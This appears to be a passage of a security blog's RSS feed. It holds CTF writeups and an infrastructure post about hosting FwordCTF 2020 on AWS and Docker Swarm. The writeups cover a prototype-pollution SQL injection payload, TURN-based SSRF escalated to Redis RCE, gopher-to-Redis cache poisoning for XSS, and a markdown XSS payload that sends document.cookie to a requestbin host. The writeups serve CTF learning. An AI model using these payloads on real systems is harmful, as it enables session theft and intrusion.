&lt;pre&gt;&lt;code&gt;{&amp;quot;widgetName&amp;quot;:&amp;quot;constructor&amp;quot;,&amp;quot;widgetData&amp;quot;:&amp;quot;{\&amp;quot;prototype\&amp;quot;:{\&amp;quot;srcdoc\&amp;quot;:\&amp;quot;&amp;lt;script src=\\\&amp;quot;https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=kahlaa%27%2C%20%28select%20flag%20from%20flag%20limit%201%29%2C%20%271%27%29%3B--&amp;amp;widgetname=1&amp;amp;widgetdata=1\\\&amp;quot; &amp;gt;&amp;lt;/script&amp;gt;\&amp;quot;}}&amp;quot;}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Note that we can execute our payload because the script-src in CSP is set to &amp;lsquo;self&amp;rsquo;.&lt;/p&gt;
&lt;p&gt;Finally we have to send the url that opens our panel to the admin in order to execute our gadget &lt;code&gt;https://build-a-better-panel.dicec.tf/create?panelId=kahlaa&lt;/code&gt; .
And Bingo we received our flag :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/AkvBN7X.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Thank you for reading all the article and sorry if it was a little bit long \o/
DiceCTF was really fun and a good one to start with after some long break :D Unfortunately I couldn&amp;rsquo;t fully participate but it was also fun to complete the tasks after its end. If you have any questions you can contact me on twitter,facebook or by mail , i&amp;rsquo;ll be very glad to help.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>International CTF Infrastructure Management</title>
      <link>https://ahmed-belkahla.me/post/fwordctf_infrastructure/</link>
      <pubDate>Tue, 22 Sep 2020 00:08:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/fwordctf_infrastructure/</guid>
      <description>&lt;p&gt;Last month our team organized &lt;strong&gt;FwordCTF 2020&lt;/strong&gt;  and we got very positive feedbacks and fortunately most of the players enjoyed their journey. More than 1900 participants and 980 teams took part of this first edition, as I was responsible of managing the infrastructure it was a great challenge to deal with this great number and create a secure environment for unsecure challenges :v so i&amp;rsquo;ll share with you my experience maybe it can inspire you.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; This is not a step by step tutorial, it&amp;rsquo;s my way to document things so I can remember them next year.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Mw8OoKF.png&#34; alt=&#34;STATS&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Cloudflare Stats:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/uTuxI3U.png&#34; alt=&#34;STATS&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;sections&#34;&gt;Sections&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Platform Infrastructure&lt;/li&gt;
&lt;li&gt;Issues We faced&lt;/li&gt;
&lt;li&gt;Challenges Management and health check&lt;/li&gt;
&lt;li&gt;Isolated Container for each participant in Bash category&lt;/li&gt;
&lt;li&gt;Next edition ?&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;platform-infrastructure&#34;&gt;Platform Infrastructure&lt;/h2&gt;
&lt;p&gt;We have mainly used AWS services, there is no special reason for this choice but I was more familiar with AWS and every member in our team had free 100$ credits in AWS Educate xD
For impatient people here is the global architecture we used at the beginning of the CTF, it was the ideal choice for us but we faced some problems that obliged us to switch to an another alternative.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/OFQnrbj.jpg&#34; alt=&#34;PLATFORM&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;4 * CTFD Instance: Ubuntu Server 20.04 LTS t2.medium (&lt;strong&gt;4Gb Memory / 2 * Vcpus&lt;/strong&gt;) : a docker swarm Master Node + 3 * Worker nodes (more details later)&lt;/li&gt;
&lt;li&gt;Redis caching instance: Ubuntu Server 20.04 LTS t2.small (&lt;strong&gt;2Gb Memory / 1 * Vcpus&lt;/strong&gt;) : A separate instance for Redis ( caching system )&lt;/li&gt;
&lt;li&gt;Bastion: Ubuntu Server 20.04 LTS t2.small (&lt;strong&gt;2Gb Memory / 1 * Vcpus&lt;/strong&gt;): As you can notice all CTFD and redis instances are in a private subnet so we can&amp;rsquo;t SSH to them that&amp;rsquo;s why we need a bastion that is in a public subnet, and as all the subnets are in the same VPC so we can SSH from Bastion to the servers in the private subnet.&lt;/li&gt;
&lt;li&gt;Amazon RDS Instance: db.t2.small at the beginning then upgraded it to db.t2.medium: Amazon RDS is a nice way to set up, operate, and scale a relational database in the cloud. It has also a nice automated backup system.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/VDq02s8.png&#34; alt=&#34;RDS&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cloudflare free plan: Cloudflare really saved us a lot , we faced more than DDOS attacks and some of them were really serious attacks but hackers can&amp;rsquo;t be hacked easily :p&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/NQr71W6.png&#34; alt=&#34;ATTACKS&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sendgrid free account (25k free emails): We used Sendgrid for email verification and for sending the certificates after the CTF.&lt;/li&gt;
&lt;li&gt;AWS Network Load Balancer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/zkGzWBn.png&#34; alt=&#34;LOADBALANCER&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AWS S3 bucket to serve the files to download.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Znt636a.png&#34; alt=&#34;S3&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NAT Gateway: NAT gateway is important to enable internet connection for the private subnets.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/sKI36vv.png&#34; alt=&#34;NAT&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;VPC:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/7jcwuKM.jpg&#34; alt=&#34;VPC&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subnets:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/pcNCzJe.png&#34; alt=&#34;SUBNETS&#34;&gt;&lt;/p&gt;
&lt;p&gt;We used docker swarm for orchestration and it was really helpful , we created 4 replicas in each node ( learn more about Docker Swarm 
&lt;a href=&#34;https://www.ionos.fr/digitalguide/serveur/know-how/docker-orchestration-avec-swarm-et-compose/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt; ) but after some time we decided to change our strategy , docker swarm had a weakness which is sharing &lt;strong&gt;volumes&lt;/strong&gt; ; every volume mount is local to that node, this was not something critical and there are some solutions available but as it was something unpredictable for us and we didn&amp;rsquo;t test it before, we decided to choose the safest option and replaced the 4 CTFD instances with a single t2.xlarge instance ( &lt;strong&gt;16GB Memory/4 Vcpus&lt;/strong&gt; ) that contains also 4 replicas of CTFD . The result is the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/WVm0KA5.jpg&#34; alt=&#34;ARCH&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;issues-we-faced&#34;&gt;Issues We faced&lt;/h2&gt;
&lt;h3 id=&#34;aws-rds&#34;&gt;AWS RDS&lt;/h3&gt;
&lt;p&gt;We are really thankful that this error occured 5 days before the CTF. Only 1 hour after the we launched the platform, we kept having internal server errors , after some debugging we discovered AWS RDS (mysql DBs in general) has an attribute &lt;strong&gt;max_connections&lt;/strong&gt; which is set by default to a low value and once we exceeded that value CTFD couldn&amp;rsquo;t connect to the database, but after changing the max_connections value and restarting things we kept having the 500 internal errors :( . After a lot of debugging and analysis I discovered that the containers couldn&amp;rsquo;t resolve the database domain name which is really strange because AWS DNS server was running flawlessly. To make things shorter, docker swarm overlay network&amp;rsquo;s IP range was overlapping with the physical network, so when the container try to resolve the DB domain name it didn&amp;rsquo;t really send a request to AWS DNS , the solution was to launch the swarm with the following command:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo docker swarm init --default-addr-pool 192.168.0.0/16
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;it took us only 35 minutes to discover the problem and solve it, but it was the most stressful minutes in my life xD&lt;/p&gt;
&lt;h3 id=&#34;common-problems&#34;&gt;Common problems&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Docker Swarm sticky sessions&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Docker swarm doesn&amp;rsquo;t have by default a layer 7  load balancer , so we had faced some problems related to sessions, the solution was easy, we only needed to add our own load balancer that supports sticky sessions (we used traefik instead of nginx and it did really great )&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Other Issues&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I needed to set &lt;strong&gt;SQLALCHEMY_MAX_OVERFLOW&lt;/strong&gt; in CTFD to a high value in order to avoid some DB problems and I also had to add some code to CTFD in order to connect successfully to my S3 bucket (AWS Educate accounts have an extra parameter that need to be used and CTFD doesn&amp;rsquo;t handle this case).&lt;/p&gt;
&lt;h2 id=&#34;challenges-management-and-health-check&#34;&gt;Challenges Management and health check&lt;/h2&gt;
&lt;p&gt;For Web tasks every framework needs a custom docker-compose.yml file so every author took care of his task.
For the other categories we used a t2.medium instance for each task and docker swarm to orchestrate the containers ( each task has 3 replicas) and to make sure that we will have no down time (if a container failed there is always two other containers running). this is an automated version where you only have to create a Dockerfile for the task (take a look at my github repo for examples):&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Steps:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Put the following docker-compose.yml file in the same directory with the task:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;version: &amp;quot;3.8&amp;quot;
services:
  task:
    image: 127.0.0.1:5000/task
    build:
      context: .
      dockerfile: ./Dockerfile
    container_name: taskName
    deploy:
      mode: replicated
      replicas: 3
    networks:
      - isolated
    ports:
      - &amp;quot;9999:1234&amp;quot; #ToChange
networks:
  isolated:
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Choose the port you want&lt;/li&gt;
&lt;li&gt;Run the following start.sh with root privileges&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;#!/bin/bash
echo &amp;quot;[!] Run me with sudo pleaaaaase!&amp;quot;
docker run -it --name registry -p 127.0.0.1:5000:5000 -d registry:2
if [ $? -eq 0 ]; then
echo &amp;quot;[+] registry done!&amp;quot;
else
    echo &amp;quot;Failed&amp;quot;
fi
docker-compose -f docker-compose.yml build
docker-compose -f docker-compose.yml push
if [ $? -eq 0 ]; then
  echo &amp;quot;[+] Image pushed!&amp;quot;
else
    echo FAILED
fi
docker swarm init
docker stack deploy --compose-file docker-compose-sample.yml task
if [ $? -eq 0 ]; then
echo &amp;quot;[+] Done, Fword FTW&amp;quot;
else
    echo FAILED
fi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; In case you faced any errors you have to leave the swarm and retry again (don&amp;rsquo;t forget to use the last version of docker-compose)&lt;/p&gt;
&lt;p&gt;This was a quick solution to facilitate things during the CTF and it may be optimized, in fact I&amp;rsquo;m thinking of releasing a tool that do everything for us but I&amp;rsquo;m just too lazy.&lt;/p&gt;
&lt;h3 id=&#34;mangement&#34;&gt;Mangement:&lt;/h3&gt;
&lt;p&gt;Some of you may be wondering how we could manage more than 22 servers, we used an awesome tool called &lt;strong&gt;
&lt;a href=&#34;https://termius.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Termius&lt;/a&gt;&lt;/strong&gt; (it&amp;rsquo;s free in Github Student Pack) which is an SSH client with a lot of awesome features, it lets you organize the servers in groups and ssh to them with just a double click.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/PFWeLl2.png&#34; alt=&#34;TERMIUS&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Platform:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/6KvLoHv.png&#34; alt=&#34;TERMIUS&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;isolated-container-for-each-participant-in-bash-category&#34;&gt;Isolated Container for each participant in Bash category&lt;/h2&gt;
&lt;p&gt;I think that many people are waiting for this section, in bash category there were some tasks that required an SSH connection so to provide a better environment we came up with this solution and every player will be assigned to an isolated container.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The idea is simple, we firstly instanciate a manager which is a container running the SSH server and for each connection it will instanciates a new container (from the image of the task) and connects to it (docker inside docker).&lt;/p&gt;
&lt;p&gt;It may look simple but it took me a little bit of time to implement it and test it. Please take a look at this &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/FwordCTF-2020/tree/master/Bash/CapiCapi&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;sample&lt;/a&gt;&lt;/strong&gt; if you want to adapt this method.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Steps:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Run &lt;code&gt;docker-compose -f docker-compose-task.yml build&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;docker-compose -f docker-compose.yml up&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;And Bingo you will have SSH listening on port 10000, you can create a cron job to kill the participants containers every period of time or optimize manage.sh script. Please feel free to contact me if you have any questions or optimizations.&lt;/p&gt;
&lt;h2 id=&#34;next-edition-&#34;&gt;Next edition ?&lt;/h2&gt;
&lt;p&gt;Personally, I prefer using kubernetes in the next edition and automate health checks for each task. Finding a solution to enable a separate environment for every participant in all categories is also a nice idea and finally develop our custom platform.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I&amp;rsquo;m so happy this edition was concluded successfully and we got great feedbacks, I have definitely learned a lot from this opportunity, can&amp;rsquo;t wait for the next edition ; it will be  more exciting !!
For any questions you can contact me on twitter or facebook!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>CSAW CTF2020 - Web RTC Writeup</title>
      <link>https://ahmed-belkahla.me/post/csaw2020-webrtc/</link>
      <pubDate>Mon, 14 Sep 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/csaw2020-webrtc/</guid>
      <description>&lt;h1 id=&#34;web-rtc-450pts-39-solves&#34;&gt;Web RTC (450pts) 39 solves&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/KJrEEZl.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Last weekend,we have been a part  of the CSAW CTF 2020 and our team Fword ranked 4th in MENA region.
We managed to solve all web challenges with my awesome teammates 
&lt;a href=&#34;https://twitter.com/Hera14165735&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@Hera&lt;/a&gt; and 
&lt;a href=&#34;https://twitter.com/BahaBaghdadi&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@Noxious&lt;/a&gt; and we have particularly enjoyed &lt;strong&gt;Web RTC&lt;/strong&gt; .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/X0z8wys.png&#34; alt=&#34;SCOREBOARD&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;tldl&#34;&gt;TL;DL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Exploiting CoTurn server in order to gain SSRF.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Escalating SSRF to RCE using Redis.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
&lt;p&gt;We have a Real Time Chat web app and we were provided with the source code / Dockerfile / supervisor.conf.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/cBI0d2H.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Examining the source code didn&amp;rsquo;t really bring something to the table.But we got some juicy stuff ,reading the Dockerfile / supervisor.conf.
It turned out that the application is using TURN protocol to relay the network traffic between peers and Redis as a caching system.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/thalPtZ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;Since the application didn&amp;rsquo;t seem vulnreable, we decide to focus basically on CoTURN server exploitation.
After searching around we found the following 
&lt;a href=&#34;https://hackerone.com/reports/333419&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HackerOne report&lt;/a&gt; which claims that it&amp;rsquo;s possible to abuse the TURN Protocol to gain SSRF. In fact,
the attacker may proxy TCP connections to the internal network by setting the &lt;strong&gt;XOR-PEER-ADDRESS&lt;/strong&gt; of the TURN connect message (method 0x000A, 
&lt;a href=&#34;https://tools.ietf.org/html/rfc6062#section-4.3&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://tools.ietf.org/html/rfc6062#section-4.3&lt;/a&gt;) to a private IPv4 address.&lt;/p&gt;
&lt;p&gt;We used the following &lt;strong&gt;
&lt;a href=&#34;https://github.com/staaldraad/turner&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;tool&lt;/a&gt;&lt;/strong&gt; to exploit that issue.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/M6NaeIz.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can notice that the Coturn server IP is returned to confirm the SSRF.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/L2aCve1.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Unfortunately fetching localhost ip didn&amp;rsquo;t work for us so we fired up wireshark to monitor the STUN (TURN Protocol is an extension of STUN protocol) packets.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/PmES4dZ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can confirm that the coTurn server has some protections blacklisting local ips. We first tried to bruteforce the internal ip but in vain , finally we managed  to bypass this protection
using &lt;strong&gt;0.0.0.0&lt;/strong&gt; ip:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/zQYbXit.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/gAqT0pL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And Bingo we achieved the first part!&lt;/p&gt;
&lt;h3 id=&#34;escalating-ssrf-to-rce-using-redis&#34;&gt;Escalating SSRF to RCE using Redis&lt;/h3&gt;
&lt;p&gt;This part was somehow trivial but it took us some time to exploit Redis properly, we used  some instructions from this &lt;strong&gt;
&lt;a href=&#34;https://github.com/jas502n/Redis-RCE&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;tool&lt;/a&gt;&lt;/strong&gt; ( we fired a Rogue server from it) and executed the following commands:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/jUFM1jt.jpg&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And Voilaa We got our beloved flag :D It was our first time dealing with RTC website and exploiting and it was really fun!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;
&lt;a href=&#34;https://www.rtcsec.com/2020/04/01-slack-webrtc-turn-compromise/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Article About the vulnerability&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;
&lt;a href=&#34;https://hackerone.com/reports/333419&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HackerOne Article&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>FwordCTF 2020 - Web/Bash Writeups</title>
      <link>https://ahmed-belkahla.me/post/fword-ctf2020/</link>
      <pubDate>Wed, 02 Sep 2020 00:08:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/fword-ctf2020/</guid>
      <description>&lt;p&gt;Our team Fword organized FwordCTF 2020 with more than 900 teams and 1900 participants , I&amp;rsquo;ve been in charge of managing the infrastructure and Web + Bash categories, we will discuss infrastructure stuffs in future articles and how to  deploy things as our platform got a maximum of 2mins down and tasks had 0 down time.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Mw8OoKF.png&#34; alt=&#34;STATS&#34;&gt;&lt;/p&gt;
&lt;p&gt;However in this article we will discuss the possible ways of solving my Web / Bash tasks.&lt;/p&gt;
&lt;h2 id=&#34;pastaxss-5-solves-500pts&#34;&gt;PastaXSS (5 solves) 500pts&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/F4BHxkK.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This task was a symfony project and we were given the souce code (in fact all tasks had the source code attached to avoid any possible ways of guess).&lt;/p&gt;
&lt;h3 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h3&gt;
&lt;p&gt;When you visit the website we have a register/login page, after creating an account we can notice that we have the possibility to post a &lt;strong&gt;jutsu&lt;/strong&gt; with markdown possibility.
There is also a feature in the website that let us import a jutsu from a website, hmmm I smell some SSRF vector here. There is also a report admin page that only accepts
&lt;code&gt;http://web1.fword.wtf/jutsu/{id}&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/XY4Rj5I.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
&lt;p&gt;Markdown in jutsu:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/mUvo0j4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;Taking a look at the source code, you can notice in this part that the web page is using some caching , things began to be interesting here (SSRF+caching can lead to some juicy results)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JutsusController.php&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
public function viewJutsu($id,EntityManagerInterface $em,CacheInterface $cache,MarkdownParserInterface $markdown){
       $repo=$em-&amp;gt;getRepository(Jutsus::class);
       $jutsu=$repo-&amp;gt;findOneBy([&amp;quot;id&amp;quot;=&amp;gt;$id]);
       $this-&amp;gt;denyAccessUnlessGranted(&amp;quot;SHOW&amp;quot;,$jutsu);
       //fetch jutsu + htmlspecialchars+markdown
       $name=$jutsu-&amp;gt;getName();
       $desc=htmlspecialchars($jutsu-&amp;gt;getDescription());
       $description=$cache-&amp;gt;get(&amp;quot;jutsu&amp;quot;.$jutsu-&amp;gt;getId(),function()use($markdown,$desc){
           return $markdown-&amp;gt;transformMarkdown($desc);
       });
       $publishedAt=$jutsu-&amp;gt;getPublishedAt()-&amp;gt;format(&#39;Y-m-d H:i:s&#39;);
       $author=$jutsu-&amp;gt;getUser();
       return $this-&amp;gt;render(&amp;quot;jutsus/show.html.twig&amp;quot;,[&amp;quot;name&amp;quot;=&amp;gt;$name,&amp;quot;description&amp;quot;=&amp;gt;$description,&amp;quot;publishedAt&amp;quot;=&amp;gt;$publishedAt,&amp;quot;author&amp;quot;=&amp;gt;$author]);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And this is the part where &lt;strong&gt;curl&lt;/strong&gt; was used (a symfony service created) :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
class Curl
{
   public function fetch(string $url):string {
       $response = shell_exec(&amp;quot;curl &#39;&amp;quot;.escapeshellcmd($url).&amp;quot;&#39; -s --max-time 6&amp;quot;);
       preg_replace(&#39;/&amp;lt;title&amp;gt;(.*)&amp;lt;\/title&amp;gt;/i&#39;,&#39;&#39;,$response);
       return (!empty($response)?substr($response,0,780):&amp;quot;&amp;quot;);

   }
   public function extractTitle(string $url):string{
       $response=$this-&amp;gt;fetch($url);
       $output=array();
       preg_match(&#39;/&amp;lt;title&amp;gt;(.*)&amp;lt;\/title&amp;gt;/i&#39;,$response,$output);
       return (array_key_exists(1,$output) ? $output[1]:&amp;quot;Unknown Jutsu&amp;quot;);

   }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So we can notice that if we can edit the cached version to have my XSS payload we will bypass htmlspecialchars sanitization and get our javascript code executed. We can achieve this if we chain
the SSRF to communicate with Redis caching system ( you can know from the configuration files that the system is using redis with the hostname redis).&lt;/p&gt;
&lt;p&gt;Using gopher protocol we can communicate with all text based protocols including redis by just following this pattern:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gopher://redis:6379/_REDIS Command&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;we need to firstly fetch all keys using &lt;strong&gt;KEYS *&lt;/strong&gt; but you can notice the use of escapeshellcmd that will escape * so we have to urlencode our payload in order to bypass this.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gopher://redis:6379/_KEYS%20%2a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This will fetch all jutsus for us&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/QZr5ljQ.png&#34; alt=&#34;RESULT&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now we only have to set that key to our XSS payload :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gopher://redis:6379/_SET%20yLAP6wFwIy%3Ajutsu5598%20%27s%3A81%3A%22%3Cscript%20src%3D%22URL%22%3E%3C%2Fscript%3E%22%3B%27&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And Bingo you will get the flag :&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;FwordCTF{Y0u_Only_h4vE_T0_cH4in_4nd_Th1nk_w3ll}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;There was an unintended solution that exploited a problem in the markdown parser (I contacted the developer to resolve this issue)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;![&amp;lt;img src=&amp;quot;#&amp;quot; onerror=&amp;quot;src=&#39;http://requestbin.net/r/12bfihl1?c=&#39;+document.cookie; this.onerror=null&amp;quot;/&amp;gt;](#){onerror=outerHTML=alt}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;useless3-solves-500pts&#34;&gt;Useless(3 solves) 500pts&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/r0HTsK7.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;In this task we were given a flask project, when we open the website we can notice in the login page the possibility to login using github.After creating an account and signing in we don&amp;rsquo;t see anything special.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/O60WJr5.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s get a look on the source code, after some digging, this part seems interesting, it&amp;rsquo;s the logic handling the Github Oauth.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;@oauth_authorized.connect_via(github_authbp)
def github_oauth(github_authbp,token):
    if not github.authorized:
        return redirect(url_for(&amp;quot;github.login&amp;quot;))
    resp = github.get(&amp;quot;/user&amp;quot;)
    if not resp.ok:
        return redirect(url_for(&amp;quot;github.login&amp;quot;))
    info=resp.json()
    auth=oauth.OAuth.query.filter_by(provider_user_id=info[&amp;quot;id&amp;quot;]).first()
    if auth is None:
        auth = oauth.OAuth(provider=&amp;quot;github&amp;quot;, provider_user_id=info[&amp;quot;id&amp;quot;], token=token)
        if auth.user:
            login_user(auth.user)
            return redirect(&amp;quot;/home&amp;quot;,302)
        else:
            if not validate_username(info[&amp;quot;login&amp;quot;]):
                return redirect(&amp;quot;/register&amp;quot;)
            if info[&amp;quot;login&amp;quot;]==&amp;quot;fwordadmin&amp;quot;:
                user = users.User(username=info[&amp;quot;login&amp;quot;], email=info[&amp;quot;email&amp;quot;],is_admin=True)
            else:
                user=users.User(username=info[&amp;quot;login&amp;quot;],email=info[&amp;quot;email&amp;quot;])
            auth.user=user
            base.db_session.add_all([user,auth])
            base.db_session.commit()
            login_user(user)
            return redirect(&amp;quot;/home&amp;quot;,302)
    else:
        login_user(auth.user)
        return redirect(&amp;quot;/home&amp;quot;, 302)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The meaning of this code (for lazy people :p ) when a user completes the Oauth dance successfully for the first time he will be registered in the database in the User table and we can also notice that &lt;strong&gt;fwordadmin&lt;/strong&gt; is the github account of the admin (this information will help us next).&lt;/p&gt;
